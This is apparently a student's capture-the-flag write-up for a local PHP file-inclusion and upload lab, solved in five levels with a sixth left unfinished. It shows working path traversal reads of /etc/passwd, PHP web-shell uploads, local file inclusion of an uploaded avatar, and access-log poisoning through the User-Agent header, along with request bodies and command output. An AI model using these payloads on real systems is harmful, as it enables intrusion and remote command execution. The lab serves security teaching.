[Level 1] Target: http://localhost:8091
	
	- We know that the flag is in /etc/passwd let look at Dockerfile
	
	RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd
	
	- When we click at any icons in the home page, "http://localhost:8091/loadImage.php?file_name=flag.png" appear, we can find some interesting things in LoadImage.php
	
	<?php 
	$file_name = $_GET['file_name'];
	$file_path = '/var/www/html/images/' . $file_name; 
	if (file_exists($file_path)) {
   	 header('Content-Type: image/png');
   	 readfile($file_path);
   	 // these lines will print out the file like an image, so we can not see it in normal way
	}
	else { // Image file not found
   	 echo " 404 Not Found";
	}
	
	=> The file path is /var/www/html/images/../../../../etc/passwd
	
	=> FINAL RESULT: we can read the flag by using curl http://localhost:8091/loadImage.php?file_name=../../../../etc/passwd
	
						root:x:0:0:root:/root:/bin/bash
                                                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                                                bin:x:2:2:bin:/bin:/usr/sbin/nologin
                                                ...
                                                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                                                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
                                                CBJS{FAKE_FLAG_FAKE_FLAG}
	
	
[Level 2] Target: http://localhost:8092
	
	- let see at index.php, there is a little bit different
	
	if (strpos($file, "..") !== false) // '..' is not a good way 
    	die("Hack detected");
    	if (file_exists($file)) { // print out any file that exist, so we can use directly /etc/passwd
    	header('Content-Type: image/png');
   	 readfile($file);
	}
	else { // Image file not found
    	echo " 404 Not Found";
	}
	
	=>> FINAL RESULT: we can read the flag by using curl http://localhost:8091/loadImage.php?file=etc/passwd
	
						root:x:0:0:root:/root:/bin/bash
                                                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                                                bin:x:2:2:bin:/bin:/usr/sbin/nologin
                                                ...
                                                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                                                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
                                                CBJS{FAKE_FLAG_FAKE_FLAG}
	
	
[Level 3] Target: http://localhost:8093
	
	- let look at index.php file
	
	session_start();
    if (!isset($_SESSION['dir'])) {

        $_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16)); // file path: /var/www/html/upload/{abc123}
    }
    $dir = $_SESSION['dir'];

    if ( !file_exists($dir) )
        mkdir($dir);

    if(isset($_FILES["files"]) && $_POST['album'] !="" ) {
        try {

            //Create Album
            $album = $dir . "/" . strtolower($_POST['album']); // we can upload a album
            if ( !file_exists($album))
                mkdir($album);

            //here, file path : /var/www/html/upload/{abc123}/{album}/file , i think we can use path traversal to get rce
            $files = $_FILES['files'];
            $count = count($files["name"]);
            
            // Save files to user's directory
            for ($i = 0; $i < $count; $i++) {
                
                $newFile = $album . "/" . $files["name"][$i];

                move_uploaded_file($files["tmp_name"][$i], $newFile);
            }

       } catch(Exception $e) {
            $error = $e->getMessage();
         }
    }
	
	
	
	- Let see in apache2.conf file
	
	Directory "/var/www/html/upload/">
        AllowOverride None
        Require all granted

        <FilesMatch ".*">
                SetHandler None
        </FilesMatch>

        Header set Content-Type application/octet-stream

        <FilesMatch ".+\.jpg$">
                Header set Content-Type image/jpeg
        </FilesMatch>
        <FilesMatch ".+\.png$">
                Header set Content-Type image/png
        </FilesMatch>
        <FilesMatch ".+\.(html|txt|php)">
                Header set Content-Type text/plain
        </FilesMatch>
	</Directory>
	
	
	=> We can not upload php file in /var/www/html/upload , it cann't be execute
	
	- But, there are somethings special here, let see
	
	COPY ./src /var/www/html

	// the group www-data can read and execute everything in /var/www/html
	RUN chown -R root:www-data /var/www/html
	RUN chmod 750 /var/www/html


	WORKDIR /var/www/html/
	RUN find . -type f -exec chmod 640 {} \;
	RUN find . -type d -exec chmod 750 {} \;

	# add write permission for upload file
	RUN chown -R root:www-data /var/www/html/upload
	RUN chmod g+w /var/www/html/upload/

	# add write permission for exploit ~~
	RUN chmod g+w /var/www/html/
	
	
	=> Upload a php payload with the album name ../.. 
	
	
	
	
	
	------WebKitFormBoundaryiteyvkSgB4H7yV2r
	Content-Disposition: form-data; name="album"

	../..
	------WebKitFormBoundaryiteyvkSgB4H7yV2r
	Content-Disposition: form-data; name="files[]"; filename="payload.php"
	Content-Type: application/x-php

	<?php system($_REQUEST["cmd"]); ?>

	------WebKitFormBoundaryiteyvkSgB4H7yV2r--
	
	=> Now, we uploaded the payload to /var/www/html
	=> FINAL RESULT: RCE http://localhost:8093/payload.php?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 
	
	
[Level 4] Target: http://localhost:8094
	
	You can see many files in the views folder, but we only need to check in profile.php and game.php
	
	let take a look at game.php
	
	if (!isset($_GET['game'])) {
        header('Location: /game.php?game=fatty-bird-1.html');
        die();
    	}
    	$game = $_GET['game'];
	?>

	<!DOCTYPE html>
	<html lang="en">
    	<head>
     	   <?php include './views/header.html'; ?>
    	</head>
	
	....
	
	<div style="background-color: white; padding: 20px;">
            <?php include './views/' . $game; ?>    // in normal, it will take /views/fatty-bird-1.html , but we will take /views/../../../etc/passwd
        </div>
	
	
	- Can we get rce in this lab, let see something special in profile.php
	...
	$response = "";
  	if (isset($_FILES["fileUpload"])) {
    	// Always store as avatar.jpg
    	move_uploaded_file($_FILES["fileUpload"]["tmp_name"], "/var/www/html/upload/" . $_SESSION["name"] . "/avatar.jpg");
    	$response = "Success";
 	}
 	...
 	=> You can see every file uploaded will be rename to avatar.jpg and no change to run
 	
 	- But you know <?php include './views/' . $game; ?> this line in game.php, include function will check the content of file and then run it
 	=>> We can upload a php payload <?php system('cat /secret.txt'); ?> 
 	=>> FINAL RESULT: http://localhost:8094/game.php?game=../upload/khanh/avatar.jpg => CBJS{FAKE_FLAG_FAKE_FLAG}
 	
 [Level 5] Target: http://localhost:8095
 
 	- First, let see in apache2.conf 
 	
 	<Directory "/var/www/html/upload/">
        AllowOverride None
        Require all granted

        <FilesMatch ".*">
                SetHandler None
        </FilesMatch>

        Header set Content-Type application/octet-stream

        <FilesMatch ".+\.jpg$">
                Header set Content-Type image/jpeg
        </FilesMatch>
        <FilesMatch ".+\.png$">
                Header set Content-Type image/png
        </FilesMatch>
        <FilesMatch ".+\.(html|txt|php)">
                Header set Content-Type text/plain
        </FilesMatch>
	</Directory>
	
	this is the same with the previous level, we can not do any thing in /var/ww/html/upload/
	
	- but, how about Dockerfile?
	
	# Set up log files
	RUN rm /var/log/apache2/access.log /var/log/apache2/error.log 
	RUN touch /var/log/apache2/access.log /var/log/apache2/error.log
	RUN chmod 777 /var/log/apache2/access.log /var/log/apache2/error.log
	RUN chown www-data:www-data /var/log/apache2/access.log /var/log/apache2/error.log
 	
 	
 	- you can see we can do something special with /var/log/apache2/access.log, we can read, write, execute command from this
 	
	- And that's all, nothing change from the previous level, <?php include './views/' . $game; ?> this line is still work
	- The only thing we can do to avoid problem is change the User-Agent
	
	GET /game.php?game=fatty-bird-1.html HTTP/1.1
	Host: localhost:8095
	sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
	sec-ch-ua-mobile: ?0
	sec-ch-ua-platform: "Linux"
	Upgrade-Insecure-Requests: 1
	User-Agent: <?php system($_REQUEST[cmd]); ?>
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	
	you can see it by root@559ec1344a9d:/var/www/html# cat /var/log/apache2/access.log 
	
	...
	172.20.0.1 - ... "GET /?game=fatty-bird-1.html HTTP/1.1" 200 2824 "-" "<?php system($_REQUEST[cmd]); ?>"
	
	=>> FINAL RESULT http://localhost:8095/?game=../../../../var/log/apache2/access.log&cmd=id
	...uid=33(www-data) gid=33(www-data) groups=33(www-data) ...
	
[Level 6] Target: http://localhost:8096
	- this lab use evilarc tool to solve the problem, so I will write the sollution soon!
	
	
	
